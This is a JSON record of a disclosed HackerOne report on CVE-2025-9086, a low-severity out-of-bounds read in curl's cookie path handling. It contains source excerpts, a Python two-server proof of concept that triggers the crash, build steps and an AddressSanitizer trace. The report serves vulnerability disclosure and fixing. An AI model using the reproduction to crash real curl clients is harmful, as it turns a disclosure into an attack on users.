@@ -1,0 +1,136 @@
+{
+  "id": 3294999,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjk0OTk5",
+  "url": "https://hackerone.com/reports/3294999",
+  "title": "CVE-2025-9086: Out of bounds read for cookie path",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2025-08-11T16:28:29.715Z",
+  "submitted_at": "2025-08-11T16:28:30.029Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bigsleep",
+    "url": "/bigsleep",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2025-9086"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-09-10T06:05:13.559Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-09-10T05:59:03.899Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "We are tracking this issue with the public ID `BIGSLEEP-437903454`. Please use this identifier for reference in any future communication.\n\n## **Vulnerability Details**\n\nIn the cookie support found in `cookie.c`, there's an out-of-bounds string comparison that results from a crafted sequence of cookie operations. When saving a new cookie, we check if it should replace an existing cookie for the same domain. We can see in the snippet below that if the previous cookie path is an empty string `\"\",` we'll skip over the NUL-terminator at \\[0\\] and read out-of-bounds when looking for a `/` in the previous cookie path.\n\n```c\nstatic int\nreplace_existing(struct Curl_easy *data,\n                 struct Cookie *co,\n                 struct CookieInfo *ci,\n                 bool secure,\n                 bool *replacep)\n{\n  bool replace_old = FALSE;\n  struct Curl_llist_node *replace_n = NULL;\n  struct Curl_llist_node *n;\n  size_t myhash = cookiehash(co->domain);\n  for(n = Curl_llist_head(&ci->cookielist[myhash]); n; n = Curl_node_next(n)) {\n    struct Cookie *clist = Curl_node_elem(n);\n    if(!strcmp(clist->name, co->name)) {\n      /* the names are identical */\n      bool matching_domains = FALSE;\n\n      if(clist->domain && co->domain) {\n        if(curl_strequal(clist->domain, co->domain))\n          /* The domains are identical */\n          matching_domains = TRUE;\n      }\n      else if(!clist->domain && !co->domain)\n        matching_domains = TRUE;\n\n      if(matching_domains && /* the domains were identical */\n         clist->spath && co->spath && /* both have paths */\n         clist->secure && !co->secure && !secure) {\n        size_t cllen;\n        const char *sep;\n\n        /*\n         * A non-secure cookie may not overlay an existing secure cookie.\n         * For an existing cookie \"a\" with path \"/login\", refuse a new\n         * cookie \"a\" with for example path \"/login/en\", while the path\n         * \"/loginhelper\" is ok.\n         */\n\n        sep = strchr(clist->spath + 1, '/'); // ***0***\n\n        if(sep)\n          cllen = sep - clist->spath;\n        else\n          cllen = strlen(clist->spath);\n\n        if(curl_strnequal(clist->spath, co->spath, cllen)) {\n          infof(data, \"cookie '%s' for domain '%s' dropped, would \"\n                \"overlay an existing cookie\", co->name, co->domain);\n          return CERR_BAD_SECURE;\n        }\u000b\n// ...\n```\n\nIf we look at the cookie parsing code, we can see that `clist->spath` is set based on the result of `sanitize_cookie_path` \\[1\\].\n\n```c\nstatic int\nparse_cookie_header(struct Curl_easy *data,\n                    struct Cookie *co,\n                    struct CookieInfo *ci,\n                    const char *ptr,\n                    const char *domain, /* default domain */\n                    const char *path,   /* full path used when this cookie is\n                                           set, used to get default path for\n                                           the cookie unless set */\n                    bool secure)  /* TRUE if connection is over secure\n                                     origin */\n{\n\n// ...\n\n      else if(curlx_str_casecompare(&name, \"path\")) {\n        strstore(&co->path, curlx_str(&val), curlx_strlen(&val));\n        if(!co->path)\n          return CERR_OUT_OF_MEMORY;\n        free(co->spath); /* if this is set again */\n        co->spath = sanitize_cookie_path(co->path); // ***1***\n        if(!co->spath)\n          return CERR_OUT_OF_MEMORY;\n      }\n\n// ...\n```\n\nIn `sanitize_cookie_path` if the `cookie_path` argument is a string consisting of the single character `'/'` then at \\[2\\] we will remove the `'/'` at the end of the path, leaving us with an empty string `\"\"`.\n\n```c\n\n/*\n * cookie path sanitize\n */\nstatic char *sanitize_cookie_path(const char *cookie_path)\n{\n  size_t len = strlen(cookie_path);\n\n  /* some sites send path attribute within '\"'. */\n  if(cookie_path[0] == '\\\"') {\n    cookie_path++;\n    len--;\n  }\n  if(len && (cookie_path[len - 1] == '\\\"'))\n    len--;\n\n  /* RFC6265 5.2.4 The Path Attribute */\n  if(cookie_path[0] != '/')\n    /* Let cookie-path be the default-path. */\n    return strdup(\"/\");\n\n  /* remove trailing slash */\n  /* convert /hoge/ to /hoge */\n  if(len && cookie_path[len - 1] == '/') // ***2***\n    len--;\n\n  return Curl_memdup0(cookie_path, len);\n}\n```\n\nIn order to reach the vulnerable code path at \\[0\\], we need to have a secure cookie set for the domain with an empty path, and then replace that cookie with a non-secure cookie. This can be arranged by first making an HTTPS request to a remote server that sets a `Secure` cookie with a `path` of `/` and then redirects to an HTTP server on the same domain which overwrites the cookie with a non-secure cookie.\n\nNote that given the subsequent usage of `sep`, it doesn't look like there is currently any avenue by which out-of-bounds memory content could be leaked by an attacker.\n\n## **Affected Version(s)**\n\nThe issue has been successfully reproduced:\n\n- at HEAD (commit `89490b16c736f2ae2219a6f8b3638210a3cf4016`)\n\n- in stable release `8.15.0`\n\n## **Reproduction**\n\nTriggering this issue requires both HTTPS and HTTP servers. Two python scripts have been provided to run those servers; you'll need to generate a self-signed certificate for use by the HTTPS server. \n\nTo simplify this, the reproduction commands use `--insecure` but this is not necessary.\n\n### **Test Case**\n\n`server.py`\n\n```py\n#! /usr/bin/python3\n\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport socket\nimport ssl\nimport threading\nimport time\n\nclass HTTPSRequestHandler(BaseHTTPRequestHandler):\n  def do_GET(self):\n    self.send_response(302)\n    self.send_header(\"Set-Cookie\", \"A=B; path=/; Secure\")\n    self.send_header(\"Location\", f\"http://{socket.gethostname()}:9080\")\n    self.end_headers()\n\nclass HTTPRequestHandler(BaseHTTPRequestHandler):\n  def do_GET(self):\n    self.send_response(200)\n    self.send_header(\"Set-Cookie\", \"A=C; path=/foo/\")\n    self.end_headers()\n    self.wfile.write(b\"A\" * 128)\n\ndef run_https_server():\n  httpd = HTTPServer(('', 9443), HTTPSRequestHandler)\n  ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n  ctx.load_cert_chain(certfile='./cert.pem', keyfile=\"./key.pem\")\n  httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)\n  httpd.serve_forever()\n\ndef run_http_server():\n  httpd = HTTPServer(('', 9080), HTTPRequestHandler)\n  httpd.serve_forever()\n\nif __name__ == \"__main__\":\n  https_thread = threading.Thread(target=run_https_server)\n  http_thread = threading.Thread(target=run_http_server)\n  https_thread.start()\n  http_thread.start()\n\n  while True:\n    time.sleep(1)\n```\n\n### **Build Instructions**\n\n```shell\ngit clone https://github.com/curl/curl\ncd curl\nexport CC=clang\nexport CXX=clang++\nexport CFLAGS=\"-fsanitize=address\"\nexport CXXFLAGS=\"-fsanitize=address\"\nexport LDFLAGS=\"-fsanitize=address\"\n\n./configure --with-openssl --disable-shared --enable-debug --enable-maintainer-mode\nmake -j$(nproc)\n```\n\n### **Command**\n\nEach set of commands needs to be run in a separate terminal.\n\nGenerate a self-signed certificate/key pair and launch the servers:\n\n```shell\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 1 -nodes -subj \"/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname\"\npython3 server.py\n```\n\nMake the request. Note that `localhost` has special treatment, so it is necessary to connect using the hostname (or to a remote server) to trigger this issue.\n\n```shell\n./src/curl --insecure -c cookies -vv -L https://$(hostname):9443\n```\n\n### **ASan Report**\n\n```\n=================================================================\n==3359244==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5030000522e1 at pc 0x55cc379a3530 bp 0x7ffd15ae2a40 sp 0x7ffd15ae2208\nREAD of size 9 at 0x5030000522e1 thread T0\n    #0 0x55cc379a352f in strchr (/tmp/repro/curl/src/curl+0xd452f) (BuildId: 150a2cfdeb779bcaf8e8f8b4535765b7b922400d)\n    #1 0x55cc37bf3b41 in replace_existing /tmp/repro/curl/lib/cookie.c:977:15\n    #2 0x55cc37bef970 in Curl_cookie_add /tmp/repro/curl/lib/cookie.c:1124:6\n    #3 0x55cc37c5f4eb in http_header_s /tmp/repro/curl/lib/http.c:3343:5\n    #4 0x55cc37c5af7d in http_header /tmp/repro/curl/lib/http.c:3473:14\n    #5 0x55cc37c50aa4 in http_rw_hd /tmp/repro/curl/lib/http.c:4123:12\n    #6 0x55cc37c519c4 in http_parse_headers /tmp/repro/curl/lib/http.c:4235:14\n    #7 0x55cc37c50d61 in Curl_http_write_resp_hds /tmp/repro/curl/lib/http.c:4292:14\n    #8 0x55cc37c41050 in Curl_http_write_resp /tmp/repro/curl/lib/http.c:4316:12\n    #9 0x55cc37b54acc in Curl_xfer_write_resp /tmp/repro/curl/lib/transfer.c:813:14\n    #10 0x55cc37b506c0 in sendrecv_dl /tmp/repro/curl/lib/transfer.c:329:14\n    #11 0x55cc37b4ecb7 in Curl_sendrecv /tmp/repro/curl/lib/transfer.c:405:14\n    #12 0x55cc37b1541c in state_performing /tmp/repro/curl/lib/multi.c:1915:12\n    #13 0x55cc37b08449 in multi_runsingle /tmp/repro/curl/lib/multi.c:2580:12\n    #14 0x55cc37b06568 in curl_multi_perform /tmp/repro/curl/lib/multi.c:2766:18\n    #15 0x55cc37acdd3a in easy_transfer /tmp/repro/curl/lib/easy.c:705:15\n    #16 0x55cc37aca511 in easy_perform /tmp/repro/curl/lib/easy.c:813:42\n    #17 0x55cc37ac9e26 in curl_easy_perform /tmp/repro/curl/lib/easy.c:831:10\n    #18 0x55cc37aa37b9 in serial_transfers /tmp/repro/curl/src/tool_operate.c:1887:18\n    #19 0x55cc37aa212a in run_all_transfers /tmp/repro/curl/src/tool_operate.c:2110:16\n    #20 0x55cc37aa1b23 in operate /tmp/repro/curl/src/tool_operate.c:2249:22\n    #21 0x55cc37aa00c7 in main /tmp/repro/curl/src/tool_main.c:199:14\n    #22 0x7f56f9d04ca7 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #23 0x7f56f9d04d64 in __libc_start_main csu/../csu/libc-start.c:360:3\n    #24 0x55cc37987c50 in _start (/tmp/repro/curl/src/curl+0xb8c50) (BuildId: 150a2cfdeb779bcaf8e8f8b4535765b7b922400d)\n\n0x5030000522e1 is located 0 bytes after 17-byte region [0x5030000522d0,0x5030000522e1)\nallocated by thread T0 here:\n    #0 0x55cc37a27a83 in malloc (/tmp/repro/curl/src/curl+0x158a83) (BuildId: 150a2cfdeb779bcaf8e8f8b4535765b7b922400d)\n    #1 0x55cc37ae6a18 in curl_dbg_malloc /tmp/repro/curl/lib/memdebug.c:147:9\n    #2 0x55cc37b4ce18 in Curl_memdup0 /tmp/repro/curl/lib/strdup.c:114:15\n    #3 0x55cc37bf6a42 in sanitize_cookie_path /tmp/repro/curl/lib/cookie.c:304:10\n    #4 0x55cc37bf0d44 in parse_cookie_header /tmp/repro/curl/lib/cookie.c:600:21\n    #5 0x55cc37bef3de in Curl_cookie_add /tmp/repro/curl/lib/cookie.c:1081:10\n    #6 0x55cc37c5f4eb in http_header_s /tmp/repro/curl/lib/http.c:3343:5\n    #7 0x55cc37c5af7d in http_header /tmp/repro/curl/lib/http.c:3473:14\n    #8 0x55cc37c50aa4 in http_rw_hd /tmp/repro/curl/lib/http.c:4123:12\n    #9 0x55cc37c519c4 in http_parse_headers /tmp/repro/curl/lib/http.c:4235:14\n    #10 0x55cc37c50d61 in Curl_http_write_resp_hds /tmp/repro/curl/lib/http.c:4292:14\n    #11 0x55cc37c41050 in Curl_http_write_resp /tmp/repro/curl/lib/http.c:4316:12\n    #12 0x55cc37b54acc in Curl_xfer_write_resp /tmp/repro/curl/lib/transfer.c:813:14\n    #13 0x55cc37b506c0 in sendrecv_dl /tmp/repro/curl/lib/transfer.c:329:14\n    #14 0x55cc37b4ecb7 in Curl_sendrecv /tmp/repro/curl/lib/transfer.c:405:14\n    #15 0x55cc37b1541c in state_performing /tmp/repro/curl/lib/multi.c:1915:12\n    #16 0x55cc37b08449 in multi_runsingle /tmp/repro/curl/lib/multi.c:2580:12\n    #17 0x55cc37b06568 in curl_multi_perform /tmp/repro/curl/lib/multi.c:2766:18\n    #18 0x55cc37acdd3a in easy_transfer /tmp/repro/curl/lib/easy.c:705:15\n    #19 0x55cc37aca511 in easy_perform /tmp/repro/curl/lib/easy.c:813:42\n    #20 0x55cc37ac9e26 in curl_easy_perform /tmp/repro/curl/lib/easy.c:831:10\n    #21 0x55cc37aa37b9 in serial_transfers /tmp/repro/curl/src/tool_operate.c:1887:18\n    #22 0x55cc37aa212a in run_all_transfers /tmp/repro/curl/src/tool_operate.c:2110:16\n    #23 0x55cc37aa1b23 in operate /tmp/repro/curl/src/tool_operate.c:2249:22\n    #24 0x55cc37aa00c7 in main /tmp/repro/curl/src/tool_main.c:199:14\n    #25 0x7f56f9d04ca7 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow (/tmp/repro/curl/src/curl+0xd452f) (BuildId: 150a2cfdeb779bcaf8e8f8b4535765b7b922400d) in strchr\nShadow bytes around the buggy address:\n  0x503000052000: fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fd\n  0x503000052080: fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd\n  0x503000052100: fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa\n  0x503000052180: fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd\n  0x503000052200: fa fa fd fd fd fd fa fa 00 00 02 fa fa fa 00 00\n=>0x503000052280: 02 fa fa fa 00 00 02 fa fa fa 00 00[01]fa fa fa\n  0x503000052300: fd fd fd fa fa fa fd fd fd fd fa fa fd fd fd fa\n  0x503000052380: fa fa fd fd fd fd fa fa fd fd fd fa fa fa fd fd\n  0x503000052400: fd fa fa fa 00 00 05 fa fa fa 00 00 05 fa fa fa\n  0x503000052480: fd fd fd fa fa fa 00 00 05 fa fa fa 00 00 01 fa\n  0x503000052500: fa fa 00 00 01 fa fa fa 00 00 00 07 fa fa 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==3359244==ABORTING\n```\n\n## **Reporter Credit**\n\nGoogle Big Sleep\n\n## **Disclosure Policy**\n\nOur assessment concluded that the finding outlined in this report has a negligible security impact. However, if your internal review indicates a greater risk to your users, please email big-sleep-vuln-reports@google.com immediately to arrange a standard disclosure deadline.\n\nOtherwise, in the interest of transparency, we will publish the details of this report on `2025-11-09`.\n\nFor more information, visit [https://goo.gle/bigsleep](https://goo.gle/bigsleep)\n\n## Impact\n\n## Summary:\n\nAlthough this vulnerability leads to a remotely-triggerable out-of-bounds read, it doesn't look like there is currently any avenue by which out-of-bounds memory content could be leaked by an attacker.\n\nOur assessment concluded that the finding outlined in this report has a negligible security impact.",
+  "weakness": {
+    "id": 9,
+    "name": "Buffer Over-read"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4667420,
+      "file_name": "server.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hmtremsp7yz77seavdnpg2iq50fr?response-content-disposition=attachment%3B%20filename%3D%22server.py%22%3B%20filename%2A%3DUTF-8%27%27server.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT5JYZBZC%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T163253Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIQCe5nk9F0p4ASik%2BBggriqpXnK5btyRVhhg04sMh1dd3gIgcDB1p5Rj%2B%2FHfce26Us%2FJC0Q77sMKgCyn1zkwMiF7AHMqsQUIQRADGgwwMTM2MTkyNzQ4NDkiDEQlkKODOywJ05pWKSqOBeUnllyFWPJIQQm9oyAeBye5VhzAlLy0aycW9sXAr68efi6Z6Y2kcWO264RhnpIoQW02r4NPHKFIJeqRJnqfl%2BGviMOvH%2BEsVbg7YjKkzQALaMXADft1pN0WeAxTyzrwyJbCnRRcrrI5QdLf0xp5k0MSDS5dYJzrZyRxABEBzEmgmCG8%2FA7DJT0SwELKgSHgDK0IpreKLHpaWE0jLWMC4XToxB9MQ9HCQ75xZ5pjKvmA6i5tyPMYvIxhHzb8S%2FaOY5brAxX250%2BP%2Fm3hiz7MCDoVHnf%2FRa3Q431svGGk4qqH26fZcccX8%2Fzor51dFi1pBmhQG0uRLJUJg2GuidECCgrWmp8LoCT9pnP1WyILIyJj4v0fheXOY7ibOIAKhEWx2FCFG7RBrb%2BuUD48HhkIJecqioNeOU0paOySAQ5AukM1jZ1ZlTr0D%2FxSRUU7CZklglN%2B6l4hLXYkj68kWVwDCA1%2FBWbkvmiL9oe65vupErGvZFtlsadmMLjjHTiby%2F7IHeLteTfDQ0huqdzV6JnrijSlLfG8VqEhlyxmV4KHhu7btnIeu7KFb4RWXBsYzkiYsFoigjJV60RkE6jnHehVeKt6j76jbQusYAGMd61ST4DIPQ3oeITGfnICzyVSpSOxK6iXSZ7jSdOIDAj64qHF5lFjUhdZU7z9uWjVv3pxzOYXCWvhhmB2M4qCFk%2BqaO4k1PnYXqwyJ3rqcIdKLp1wbMls%2BRMSrx%2F6JBy4ezXrOY2iJ1%2F6nt%2FdaEQQUNEOSh%2FXVitTFoKh5pSF1bx2yA8pVjGwLfZ3K%2F%2FVcw63gRtvk%2FppidsP3Wlw2HrAnYI8Dl0ffOLxK9SqtlnuP1Vmp0RKuBxG4CFTbSY6L5TBc%2FxBazCGvNjPBjqxAW8G3lkIwSNymypp0GKvUFtDI0RApXFQhHEUr3thtlOwMtoH3TBYaWnMkdcVN93h9xo9Ld34%2BGUTB4lHlU7tUZJt9zS7mQnuJPn07zvifVerN9b45LzPKp%2BamB8lkmC1U6yUUsvrsbBgpYlo%2FvT9LId37SuGCFDjrrayKxiOjk2LpK9Op2wagBBxO3GN8sUSOXWjbTdf4mwBdPZqNlxiwJdxFMbFoTCoEAHki6qGnY7rLg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b85b9ff457ef6f256c8362f743a3c36c09cb6a2bfc962bd41d05056b2a0d38f4",
+      "file_size": 1214,
+      "type": "application/x-sh",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-10-10T05:59:04.118Z",
+  "allow_singular_disclosure_after": -17663629.22363822,
+  "singular_disclosure_allowed": true,
+  "vote_count": 36,
+  "voters": [
+    "zy9ard3",
+    "mysanismine",
+    "thalaivar304",
+    "2026",
+    "oblivionsage",
+    "wefega",
+    "neilx",
+    "mr-alienx-kurd",
+    "galactuss",
+    "rownok-11",
+    "and 26 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
